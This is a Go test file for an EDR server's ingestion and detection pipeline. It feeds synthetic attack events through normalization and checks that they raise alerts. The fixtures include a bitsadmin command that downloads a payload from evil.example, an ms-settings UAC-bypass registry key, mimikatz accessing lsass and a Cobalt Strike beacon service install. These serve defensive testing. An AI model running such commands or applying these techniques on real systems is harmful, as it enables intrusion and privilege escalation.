package ingestion

import (
	"encoding/json"
	"testing"

	v1 "github.com/edr-platform/proto/agent/v1"
	"github.com/edr-platform/server/internal/detection"
)

// TestPromoteEventType locks the type-promotion mapping extracted from
// publishEventBatch. A regression here silently drops the affected source at
// ingestion (the process_block gap class, 2026-06-19), so each log-style prefix
// is asserted explicitly alongside the proto-typed and unknown cases.
func TestPromoteEventType(t *testing.T) {
	cases := []struct {
		name string
		evt  *v1.Event
		want string
	}{
		{"proto process", &v1.Event{Type: v1.EventType_EVENT_TYPE_PROCESS}, "process"},
		{"proto dns", &v1.Event{Type: v1.EventType_EVENT_TYPE_DNS}, "dns"},
		{"fim_change ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "fim_change:u:{}"}, "file"},
		{"process_stats ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "process_stats:u:[]"}, "process_stats"},
		{"process_block ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "process_block:u:{}"}, "process_block"},
		{"memory ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "memory:u:{}"}, "memory"},
		{"credential_access ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "credential_access:u:{}"}, "credential_access"},
		{"create_remote_thread ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "create_remote_thread:u:{}"}, "create_remote_thread"},
		{"tls_handshake ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "tls_handshake:u:{}"}, "tls_handshake"},
		{"ps_module ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "ps_module:u:{}"}, "ps_module"},
		{"pipe_created ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "pipe_created:u:{}"}, "pipe_created"},
		{"eventlog_cleared ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "eventlog_cleared:u:{}"}, "eventlog_cleared"},
		{"service_installed ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "service_installed:u:{}"}, "service_installed"},
		{"device_event ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "device_event:u:{}"}, "device_event"},
		{"tamper ID", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "tamper:u:{}"}, "tamper"},
		{"unknown LOG dropped", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: "weird:u:{}"}, ""},
		{"empty LOG dropped", &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG}, ""},
	}
	for _, c := range cases {
		if got := promoteEventType(c.evt); got != c.want {
			t.Errorf("%s: promoteEventType = %q, want %q", c.name, got, c.want)
		}
	}
}

// TestWireFormatToAlertE2E is the synthetic-injection E2E for the detection
// sources. It drives each agent-emitted event through the REAL ingestion
// normalization (promoteEventType + normalizeEventData) and the IO-free
// detection oracle (detection.EvaluateEnvelope), asserting a malicious event
// produces a finding and a benign one does not.
//
// This guards the producer→consumer contract — does the normalized flat map
// carry the exact keys each detection source needs to fire? — which is the
// class of break that surfaced during live validation (a renamed/dropped key
// silently zeroed a source) and which the two halves' isolated unit tests
// (handler_pure_test, TestTypedFindings) cannot catch on their own. Runs with
// no NATS/DB/gRPC, so it is a CI merge gate, not an integration-only check.
func TestWireFormatToAlertE2E(t *testing.T) {
	const (
		credWire = `credential_access:11111111-1111-1111-1111-111111111111:` +
			`{"source_image":"mimikatz.exe","source_pid":1234,"target_pid":856,"target_image":"lsass.exe","access_mask":"0x1410","enforced":false}`
		memWire = `memory:22222222-2222-2222-2222-222222222222:` +
			`{"pid":4242,"process_name":"evil.exe","address":"0x1000","unbacked":true,"reason":"RWX unbacked region"}`
		// Blocklisted Cobalt Strike beacon JA3 → behavioral C2 finding.
		tlsWire = `tls_handshake:33333333-3333-3333-3333-333333333333:` +
			`{"dst_ip":"203.0.113.10","dst_port":443,"sni":"cdn.evil.example","ja3":"72a589da586844d7f0818ce684948eea","process_name":"svchost.exe","pid":990}`
		logClearWire = `eventlog_cleared:44444444-4444-4444-4444-444444444444:` +
			`{"channel":"Security","user":"attacker","backup_path":""}`
		svcMalWire = `service_installed:55555555-5555-5555-5555-555555555555:` +
			`{"service_name":"PSEXESVC","image_path":"C:\\Windows\\Temp\\beacon.exe","service_type":"user","start_type":"demand","account":"LocalSystem"}`
		svcBenignWire = `service_installed:66666666-6666-6666-6666-666666666666:` +
			`{"service_name":"MyApp","image_path":"C:\\Program Files\\MyApp\\svc.exe","service_type":"user","start_type":"auto","account":"LocalSystem"}`
		usbStorageWire = `device_event:77777777-7777-7777-7777-777777777777:` +
			`{"action":"connected","device_id":"1-1.2","name":"SanDisk Cruzer","vendor_id":"0781","product_id":"5567","type":"storage"}`
		usbInputWire = `device_event:88888888-8888-8888-8888-888888888888:` +
			`{"action":"connected","device_id":"1-1.3","name":"USB Keyboard","vendor_id":"046d","product_id":"c31c","type":"input"}`
		// Agent self-protection. The watchdog spools this shape when the agent dies
		// by a signal it did not send; the agent ships it on its next start.
		tamperKillWire = `tamper:99999999-9999-9999-9999-999999999999:` +
			`{"tamper_type":"agent_killed","component":"edr-agent","enforced":false,"target_pid":4242,"signal":9,"exit_code":-1,"reason":"エージェントプロセスがシグナルで終了しました"}`
		tamperBinaryWire = `tamper:aaaaaaaa-9999-9999-9999-999999999999:` +
			`{"tamper_type":"binary_modified","component":"binary","enforced":false,"path":"/usr/local/bin/edr-agent","expected_hash":"aaaa","actual_hash":"bbbb","reason":"実行中に監視対象のファイルが変更されました"}`
		// A tamper_type no rule claims. Present to keep the family honest: if this
		// ever fires, some rule is matching on the event type alone rather than on
		// what actually happened.
		tamperUnknownWire = `tamper:bbbbbbbb-9999-9999-9999-999999999999:` +
			`{"tamper_type":"something_new","component":"edr-agent","enforced":false}`
	)

	cases := []struct {
		name     string
		evt      *v1.Event
		wantFire bool
		wantSrc  string // a source that must appear among the findings when firing
	}{
		{
			name:     "credential_access wire format",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: credWire},
			wantFire: true, wantSrc: "credential_access",
		},
		{
			name:     "memory wire format",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: memWire},
			wantFire: true, wantSrc: "memory",
		},
		{
			name:     "tls_handshake JA3 blocklist wire format",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: tlsWire},
			wantFire: true, wantSrc: "behavioral",
		},
		{
			name:     "eventlog_cleared wire format",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: logClearWire},
			wantFire: true, wantSrc: "eventlog_cleared",
		},
		{
			name:     "malicious service install fires T1543.003",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: svcMalWire},
			wantFire: true, wantSrc: "service_installed",
		},
		{
			name:     "benign Program Files service install fires nothing",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: svcBenignWire},
			wantFire: false,
		},
		{
			name:     "USB mass-storage connect fires T1091/T1052",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: usbStorageWire},
			wantFire: true, wantSrc: "device_event",
		},
		{
			name:     "USB input device (keyboard) connect fires nothing",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: usbInputWire},
			wantFire: false,
		},
		{
			name:     "agent killed by signal fires T1562.001",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: tamperKillWire},
			wantFire: true, wantSrc: "sigma",
		},
		{
			name:     "agent binary modified fires T1554/T1562.001",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: tamperBinaryWire},
			wantFire: true, wantSrc: "sigma",
		},
		{
			name:     "unrecognised tamper_type fires nothing",
			evt:      &v1.Event{Type: v1.EventType_EVENT_TYPE_LOG, Id: tamperUnknownWire},
			wantFire: false,
		},
		{
			name: "dns DGA heuristic",
			evt: &v1.Event{
				Type:    v1.EventType_EVENT_TYPE_DNS,
				Payload: &v1.Event_Dns{Dns: &v1.DnsEvent{Query: "kq3v9z7x1p.com", QueryType: "A"}},
			},
			wantFire: true, wantSrc: "heuristic",
		},
		{
			name: "dns agent is_suspicious verdict (homograph the server heuristic misses)",
			evt: &v1.Event{
				Type:    v1.EventType_EVENT_TYPE_DNS,
				Payload: &v1.Event_Dns{Dns: &v1.DnsEvent{Query: "paypa1.com", QueryType: "A", IsSuspicious: true}},
			},
			wantFire: true, wantSrc: "heuristic",
		},
		{
			name: "process bitsadmin (builtin Sigma)",
			evt: &v1.Event{
				Type: v1.EventType_EVENT_TYPE_PROCESS,
				Payload: &v1.Event_Process{Process: &v1.ProcessEvent{
					ProcessName: "bitsadmin.exe",
					ImagePath:   `C:\Windows\System32\bitsadmin.exe`,
					CommandLine: `bitsadmin /transfer j https://evil.example/p.exe C:\Users\Public\p.exe`,
					Action:      v1.ProcessEvent_PROCESS_ACTION_CREATE,
				}},
			},
			wantFire: true, wantSrc: "sigma",
		},
		{
			name: "registry ms-settings UAC bypass (builtin Sigma)",
			evt: &v1.Event{
				Type: v1.EventType_EVENT_TYPE_REGISTRY,
				Payload: &v1.Event_Registry{Registry: &v1.RegistryEvent{
					KeyPath:   `HKCU\Software\Classes\ms-settings\shell\open\command`,
					ValueData: `C:\Users\v\AppData\Local\Temp\evil.exe`,
					Action:    v1.RegistryEvent_REGISTRY_ACTION_CREATE,
				}},
			},
			wantFire: true, wantSrc: "sigma",
		},
		{
			name: "benign process fires nothing",
			evt: &v1.Event{
				Type: v1.EventType_EVENT_TYPE_PROCESS,
				Payload: &v1.Event_Process{Process: &v1.ProcessEvent{
					ProcessName: "notepad.exe",
					ImagePath:   `C:\Windows\System32\notepad.exe`,
					CommandLine: `notepad.exe`,
					Action:      v1.ProcessEvent_PROCESS_ACTION_CREATE,
				}},
			},
			wantFire: false,
		},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			// Real ingestion: type promotion must not silently drop the event.
			evtType := promoteEventType(c.evt)
			if evtType == "" {
				t.Fatalf("event type promoted to empty — would be silently dropped at ingestion")
			}
			var flat map[string]interface{}
			if err := json.Unmarshal(normalizeEventData(c.evt), &flat); err != nil {
				t.Fatalf("normalizeEventData produced non-object JSON: %v", err)
			}

			// Real (IO-free) detection over the normalized event.
			findings := detection.EvaluateEnvelope(evtType, flat)

			if c.wantFire && len(findings) == 0 {
				t.Fatalf("expected a finding, got none (type=%s flat=%+v)", evtType, flat)
			}
			if !c.wantFire && len(findings) > 0 {
				t.Fatalf("expected no finding, got %d (first=%+v)", len(findings), findings[0])
			}
			if c.wantFire && c.wantSrc != "" {
				found := false
				for _, f := range findings {
					if f.Source == c.wantSrc {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected a %q finding among %d findings: %+v", c.wantSrc, len(findings), findings)
				}
			}
		})
	}
}
